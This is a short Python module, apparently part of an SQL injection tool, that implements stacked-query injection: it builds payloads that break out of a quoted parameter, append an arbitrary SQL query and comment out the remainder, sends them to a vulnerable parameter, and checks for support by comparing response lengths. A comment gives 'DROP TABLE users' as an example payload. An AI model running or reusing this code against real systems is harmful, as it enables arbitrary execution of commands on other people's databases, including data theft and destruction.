import logging

logger = logging.getLogger(__name__)

class StackedTechnique:
    def __init__(self, request, vuln, settings):
        self.request = request
        self.vuln = vuln
        self.settings = settings
        
    def execute(self, query):
        """Execute arbitrary SQL query via stacked injection"""
        # Example: original' ; DROP TABLE users; --
        payload = f"{self.vuln['original_value']}' ; {query} ; -- -"
        resp = self.request.send(self.vuln['param'], payload, self.vuln['location'])
        return resp is not None  # success if no error
    
    def is_supported(self):
        """Check if DBMS supports stacked queries"""
        # Try a simple harmless stacked query
        test_payload = f"{self.vuln['original_value']}' ; SELECT 1 ; -- -"
        resp = self.request.send(self.vuln['param'], test_payload, self.vuln['location'])
        # If no error and response length differs, probably supported
        baseline = self.request.send(self.vuln['param'], self.vuln['original_value'], self.vuln['location'])
        if resp and baseline:
            return len(resp.text) != len(baseline.text)
        return False